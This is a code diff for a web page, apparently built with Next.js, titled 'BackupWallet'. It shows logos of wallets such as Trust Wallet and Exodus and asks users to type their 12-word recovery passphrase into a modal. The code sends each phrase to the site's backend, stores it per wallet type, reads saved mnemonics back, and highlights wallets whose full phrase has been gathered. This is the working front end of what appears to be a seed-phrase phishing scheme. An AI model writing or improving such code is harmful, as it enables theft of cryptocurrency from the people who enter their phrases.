@@ -3,12 +3,16 @@
 import Image from "next/image";
 import '../../app/globals.css';
 import { useState } from "react";
-import axios,{AxiosError} from "axios";
+import axios, { AxiosError } from "axios";
 import apiClient from "@/lib/axios-config";
 import Footer1 from "@/components/footers/Footer1";
 
+interface CryptoService {
+    name: string;
+    logo: string;
+}
 
-const cryptoServices = [
+const cryptoServices: CryptoService[] = [
     { name: "Trust Wallet", logo: 'https://s3.coinmarketcap.com/static-gravity/image/bdb7a8c7bb114e8aa29f8b6fee2e7a41.png' },
     { name: "Lobstr", logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxZO-w6G9AhJ0wp-OJ0-JSCnTg-VkTBLvRTw&s' },
     { name: "Exodus", logo: 'https://www.bestcrypto-wallet.com/wp-content/uploads/2025/04/exodus-logo.jpg' },
@@ -20,52 +24,51 @@ const cryptoServices = [
 ];
 
 export default function BackupWallet() {
-    const [selectedWallet, setSelectedWallet] = useState<any>(null);
+    const [selectedWallet, setSelectedWallet] = useState<CryptoService | null>(null);
     const [isModalOpen, setIsModalOpen] = useState(false);
-    const [words, setWords] = useState(Array(12).fill(""));
+    const [words, setWords] = useState<string[]>(Array(12).fill(""));
+    const [filledWallets, setFilledWallets] = useState<string[]>([]);
 
-    const openModal = async (wallet: any) => {
-    setSelectedWallet(wallet);
-    setIsModalOpen(true);
+    const openModal = async (wallet: CryptoService) => {
+        setSelectedWallet(wallet);
+        setIsModalOpen(true);
 
-    try {
-        const token = localStorage.getItem("token");
-        // const res = await axios.get(
-        //     `http://localhost:1000/api/history/get_words`,
-        //     { headers: { Authorization: `Bearer ${token}` } }
-        // );
-        const res = await apiClient.get('/api/history/get_words',{
-            headers: {
-                Authorization: `Bearer ${token}`
+        try {
+            const res = await apiClient.get('/api/history/get_word', {
+                headers: {
+                    Authorization: `Bearer ${localStorage.getItem("token")}`
+                }
+            });
+
+            if (res.data.status_code && res.data.wallets?.length) {
+                // Find the wallet for this type
+                const savedWallet = res.data.wallets.find(
+                    (w: any) => w.type === wallet.name
+                );
+
+                if (savedWallet?.mnemonic) {
+                    const mnemonicWords = savedWallet.mnemonic.split(' ');
+                    setWords([
+                        ...mnemonicWords,
+                        ...Array(12 - mnemonicWords.length).fill("")
+                    ]);
+                } else {
+                    setWords(Array(12).fill(""));
+                }
+                const walletsWithAllWords = res.data.wallets
+                    .filter((w: any) => w.mnemonic?.split(' ').length === 12)
+                    .map((w: any) => w.type);
+
+                setFilledWallets(walletsWithAllWords);
+            } else {
+                setWords(Array(12).fill(""));
             }
-        });
-
-        if (res.data.status_code && res.data.data) {
-            // Prefill the state with existing words
-            const saved = res.data.data;
-            setWords([
-                saved.one || "",
-                saved.two || "",
-                saved.three || "",
-                saved.four || "",
-                saved.five || "",
-                saved.six || "",
-                saved.seven || "",
-                saved.eight || "",
-                saved.nine || "",
-                saved.ten || "",
-                saved.eleven || "",
-                saved.twelve || ""
-            ]);
-        } else {
+        } catch (err) {
+            const error = err as AxiosError<{ msg: string }>;
+            alert(error.response?.data?.msg || "❌ Something went wrong.");
             setWords(Array(12).fill(""));
         }
-    } catch (err) {
-    const error = err as AxiosError<{ msg: string }>;
-    // alert(error.response?.data?.msg || "❌ Something went wrong.");
-        setWords(Array(12).fill(""));
-    }
-};
+    };
 
 
     const closeModal = () => {
@@ -82,12 +85,14 @@ export default function BackupWallet() {
 
     const handleSubmit = async () => {
         if (words.some(word => word.trim() === "")) {
-            // alert("fill all 12 words.");
+            alert("Please fill all 12 words.");
             return;
         }
 
+        if (!selectedWallet) return;
+
         try {
-            const payload = { // Replace with actual logged-in user ID
+            const payload = {
                 type: selectedWallet.name,
                 one: words[0],
                 two: words[1],
@@ -103,15 +108,7 @@ export default function BackupWallet() {
                 twelve: words[11]
             };
 
-            const res = await axios.post(
-            "http://localhost:1000/api/history/add_word",
-            payload,
-            {
-                headers: {
-                    Authorization: `Bearer ${localStorage.getItem("token")}`
-                }
-            }
-        );
+            const res = await apiClient.post('/api/history/add_word', payload);
 
             if (res.data.status_code) {
                 // alert("✅ Wallet words saved successfully");
@@ -120,8 +117,8 @@ export default function BackupWallet() {
                 // alert("❌ " + res.data.msg);
             }
         } catch (err) {
-                   const error = err as AxiosError<{ msg: string }>;
-                  // alert(error.response?.data?.msg || "❌ Something went wrong.");
+            const error = err as AxiosError<{ msg: string }>;
+            alert(error.response?.data?.msg || "❌ Something went wrong.");
         }
     };
 
@@ -132,9 +129,12 @@ export default function BackupWallet() {
             <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-[20px]">
                 {cryptoServices.map((service, i) => (
                     <div
-                        key={i}
+                        key={service.name} // use unique key
                         onClick={() => openModal(service)}
-                        className="flex items-center gap-4 bg-black/20 rounded-lg px-3 py-3 transition border border-[#f1f1f2] cursor-pointer hover:bg-black/40"
+                        // className={`flex items-center gap-4 bg-black/20 rounded-lg px-3 py-3 transition border ${words.every((word) => word.trim() !== "") ? "border-[#008000]" : "border-[#f1f1f2]"
+                        //     } cursor-pointer hover:bg-black/40`}
+                        className={`flex items-center gap-4 bg-black/20 rounded-lg px-3 py-3 transition border ${filledWallets.includes(service.name) ? "!border-[#008000]" : "border-[#f1f1f2]"
+                            } cursor-pointer hover:bg-black/40`}
                     >
                         <div className="w-12 h-12 relative rounded-lg overflow-hidden mr-[12px]">
                             <Image
@@ -150,7 +150,6 @@ export default function BackupWallet() {
                     </div>
                 ))}
             </div>
-
             {isModalOpen && selectedWallet && (
                 <div className="fixed inset-0 z-50 bg-black bg-opacity-70 flex justify-center items-center">
                     <div className="bg-[#1a1a1a] rounded-lg w-[90%] max-w-md p-8 relative text-white">
@@ -168,15 +167,15 @@ export default function BackupWallet() {
                         </div>
                         <hr className="my-4" />
                         <p className="mb-[20px] text-center text-[16px]">Enter your 12-word passphrase:</p>
-                        <div className="grid grid-cols-2 gap-[10px] mb-[16px] !text-[13px]">
-                            {Array.from({ length: 12 }).map((_, i) => (
+                        <div className="grid grid-cols-2 gap-[10px] mb-[16px] text-[13px]">
+                            {words.map((word, i) => (
                                 <input
                                     key={i}
                                     type="text"
                                     placeholder={`Word ${i + 1}`}
-                                    value={words[i]}
+                                    value={word}
                                     onChange={(e) => handleWordChange(i, e.target.value)}
-                                    className="!bg-[#333] p-2 rounded text-white border !border-gray-600 outline-none !text-[13px] placeholder:!text-[13px]"
+                                    className="bg-[#333] p-2 rounded text-white border border-gray-600 outline-none placeholder:text-[13px]"
                                 />
                             ))}
                         </div>
